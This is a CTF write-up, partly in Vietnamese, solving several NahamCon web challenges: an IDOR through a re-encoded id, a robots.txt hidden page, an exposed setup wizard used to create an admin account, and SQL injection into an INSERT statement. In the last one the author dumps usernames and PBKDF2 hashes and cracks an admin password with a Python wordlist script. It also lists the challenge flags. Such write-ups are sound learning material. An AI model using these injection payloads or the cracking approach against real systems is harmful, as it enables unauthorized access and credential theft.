# IDOR 


![335429425-8f2baf90-926c-47f7-bd4a-bf0e04253e31](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/b5d18877-dbcc-4c08-8f69-92e982d80f3e)

+ ta có thông tin về hint hash là sha256 ở url ta sẽ mang đi decode và nó đang là id = 11 nên ta sẽ chuyển thành id = 0 và encode nó lại

=> sau khi encode lại ta sẽ chèn vào url 

![335429789-110fdda7-cf77-40db-bd6a-b399dddd33f9](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/a25e68fe-92b4-44d2-a0ad-b6d6e18b00e5)

=> flag: flag{770a058a80a9bca0a87c3e2ebe1ee9b2} 



# challenges: All About Robots

+ trong phần mô tả có đề cập tới file check robots.txt

http://challenge.nahamcon.com:32155/robots.txt

```
User-agent: *
Disallow: /open_the_pod_bay_doors_hal_and_give_me_the_flag.html
```
http://challenge.nahamcon.com:32155/open_the_pod_bay_doors_hal_and_give_me_the_flag.html

Flag 

=> flag{3f19b983c1de42bd49af1a237d7e57b9}


# challenges HelpfulDesk

## Description: 

> bài này mới chỉ download được file zip update bị lỗ hổng 

## solve 

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/fc8b03fb-ef93-4568-a039-b90579328c1d)

+ bài này ta sẽ download file zip chưa bản update bị lỗ hổng của trang web này

+ unzip file ra ta có rất nhiều file config sau đó ta có thể decomplie file exe bằng cách dùng dotpeek để reverse code

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/84020faf-b493-43cf-b45a-6b74551a1b3b)


+ trong đó ta thấy có 1 dòng code config có 1 thông tin về path ẩn

```
public IActionResult SetupWizard()
    {
      if (File.Exists(this._credsFilePath))
      {
        PathString path = ((ControllerBase) this).HttpContext.Request.Path;
        if (((PathString) ref path).Value.TrimEnd('/').Equals("/Setup/SetupWizard", StringComparison.OrdinalIgnoreCase))
          return (IActionResult) this.View("Error", (object) new ErrorViewModel()
          {
            RequestId = "Server already set up.",
            ExceptionMessage = "Server already set up.",
            StatusCode = 403
          });
      }
      return (IActionResult) this.View();
```

challenge.nahamcon.com:30491/Setup/SetupWizard/

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/3f3998eb-081c-4c55-8bc0-9006e08ce6ba)

+ add thêm username password ta đặt là admin:admin

nhắc lại dotpeek ta check phân helpfuldesk controller 

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/5402e05f-67b7-42c2-9b81-eb0a3fb4165c)


+ sau đăng nhập vào ta được HOST-WIN-DX130S2

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/b2aab063-70c7-4e67-b53e-08adda914426)

=> flag: flag{2fd5d91a4504ecf32a1b701a4b7122db}



**trong bài có sử dụng thêm tool snyk.io**


# Challenge Name: Hacker Web Store

## Description

> LTT
  
Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.  
  
  
**Attachments:**  [password_list.txt](https://ctf.nahamcon.com/files/0b0df3700fc27beb86dfe2b6d8b077a7/password_list.txt?token=eyJ1c2VyX2lkIjozOTA1LCJ0ZWFtX2lkIjoxODczLCJmaWxlX2lkIjo5M30.ZlJYNQ.2HbqOXfKPZjnZbsNoX0nazWNy88)

## Detailed solution

http://challenge.nahamcon.com:32399/

We have an app with a login page and the option to create posts.

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/e144cd0c-6fcc-49c3-a3f4-76bc8cab0a43)

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/6a233287-bee8-41f7-be71-8c817fbcbd90)

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/dc754595-00c7-491f-b8b3-2ef0ef96a275)

While testing post creation, I detected a SQL injection while sending `'`

![image](https://github.com/neo-M3tinez/nahamCon_CTF/assets/174318737/1d02b5c2-be96-48b7-b0f3-cb4b8ba4b5b9)

The values used in post creation have `'` which block using dynamic data.

We can close the first post value and add next to it a second post with dynamic data like this for the description

```
post 1') , ('Product2', '15.99', 'Description2
```

I started checking for columns inside users table, and I was able to detect name and password using `SELECT X FROM users`

```
1') , ('Product2', (SELECT password FROM users), 'Description3
```

We have multiple users so we need to use LIMIT and OFFSET to get all users names and passwords

```
1') , ('Product2', (SELECT name FROM users LIMIT 1 OFFSET 0), 'Description3
```

```
Joram
```

Repeating the same logic for multiple OFFSET (we have 3 users), we were able to get the users 

```
Joram

James

website_admin_account
```

```
pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2b
pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```

As mentioned in the challenge description, we have a custom password list to crack the hashes

Doing some research, I found that the hash format is used by Python Werkzeug `generate_password_hash`

We need to make a custom function and use the same hash type, iterations, and salt to generate hashes from passwords list and compare them to our hashes.

Here is the example for the `website_admin_account` hash

```python
from werkzeug.security import _hash_internal
import sys

def generate_password_hash(password, method="pbkdf2:sha256:600000"):
    """Hash a password with the given method and salt with a string of
    the given length. The format of the string returned includes the method
    that was used so that :func:`check_password_hash` can check the hash.

    The format for the hashed string looks like this::

        method$salt$hash

    This method can **not** generate unsalted passwords but it is possible
    to set param method='plain' in order to enforce plaintext passwords.
    If a salt is used, hmac is used internally to salt the password.

    If PBKDF2 is wanted it can be enabled by setting the method to
    ``pbkdf2:method:iterations`` where iterations is optional::

        pbkdf2:sha256:80000$salt$hash
        pbkdf2:sha256$salt$hash

    :param password: the password to hash.
    :param method: the hash method to use (one that hashlib supports). Can
                   optionally be in the format ``pbkdf2:<method>[:iterations]``
                   to enable PBKDF2.
    :param salt_length: the length of the salt in letters.
    """
    salt = "MSok34zBufo9d1tc"
    h, actual_method = _hash_internal(method, salt, password)
    return "%s$%s$%s" % (actual_method, salt, h)

f = open("pass.txt", "r")
o = open("crack-admin.txt", "w")

for x in f:
   hash = generate_password_hash(x.strip(),method='pbkdf2:sha256:600000')
   a = f"{x.strip()} {hash}"
   o.write(a)
   print(x.strip())
   if hash == "pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57":
       print(f"{x.strip()} found password")
       sys.exit()
o.close()

```

```
ntadmin1234 found password
```

We got our match with `ntadmin1234`

We can login now with  `website_admin_account:ntadmin1234` and get our flag

## Flag

```
flag{87257f24fd71ea9ed8aa62837e768ec0}
```
